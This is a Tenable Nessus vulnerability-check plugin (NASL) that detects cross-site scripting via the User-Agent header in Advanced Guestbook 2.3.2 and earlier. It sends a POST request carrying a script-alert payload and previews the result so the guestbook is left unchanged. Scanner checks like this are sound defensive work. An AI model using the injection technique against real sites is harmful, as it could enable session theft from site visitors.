#
# (C) Tenable Network Security
#


if (description) {
  script_id(19308);
  script_version("$Revision: 1.9 $");

  script_bugtraq_id(14391);

  name["english"] = "Advanced Guestbook User-Agent HTML Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script which is vulnerable to a cross site
scripting issue.

Description :

The remote host is running Advanced Guestbook, a free guestbook
written in PHP. 

The installed version of Advanced Guestbook fails to properly sanitize
the 'HTTP_USER_AGENT' environment variable before using it in
dynamically generated content.  An attacker can exploit this flaw to
launch cross-site scripting attacks against the affected application. 

Solution : 

Upgrade to Advanced Guestbook version 2.3.3 or later.

See also : 

http://proxy2.de/forum/viewtopic.php?t=4144
http://www.dom-team.net/advisories/Advisory2.txt


Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for User-Agent HTML injection vulnerability in Advanced Guestbook";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/addentry.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like Advanced Guestbook...
  if ('<form method="post" action="addentry.php" name="book"' >< res) {
    # Carbonize's image verification hack (http://carbonize.co.uk/Board/viewtopic.php?p=90)
    # prevents us from using the form programmaticly so, if it's in use,
    # we'll just check the banner instead.
    if ('img src="verifyimage.php?k=' >< res) {
      pat = '>Advanced Guestbook ([^<]+)</font>';
      matches = egrep(string:res, pattern:pat);
      if (matches) {
        foreach match (split(matches)) {
          match = chomp(match);
          ver = eregmatch(string:match, pattern:pat);
          if (!isnull(ver)) {
            ver = ver[1];
            # nb: 2.3.2 and below are affected.
            if (ver =~ "^([01]\.|2\.([0-2]|3\.[0-2]))") {
              	security_note(port);
              exit(0);
            }
            break;
          }
        }
      }
    }
    else {
      # Get the verification hash, if it exists.
      pat = '<input type="hidden" name="gb_hash" value="(.+)">';
      matches = egrep(string:res, pattern:pat);
      if (matches) {
        foreach match (split(matches)) {
          match = chomp(match);
          hash = eregmatch(string:match, pattern:pat);
          if (!isnull(hash)) {
            hash = hash[1];
            break;
          }
        }
      }

      # Try to exploit the flaw.
      postdata = string(
        "gb_name=NESSUS&",
        "gb_comment=Test+from+", SCRIPT_NAME, "&",
        # nb: previewing the results will tell us whether the flaw exists
        #     without actually updating the guestbook.
        "gb_action=Preview"
      );
      if (hash) {
        postdata = string(
          "gb_hash=", hash, "&",
          postdata
        );
      }
      req = string(
        "POST ", dir, "/addentry.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", urlencode(str:string('">', xss)), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see our XSS.
      if (xss >< res) {
	if ( func_has_arg("security_note", "confidence") )
        	security_note(port:port, confidence:100);
	else
        	security_note(port);
        exit(0);
      }
    }
  }
}
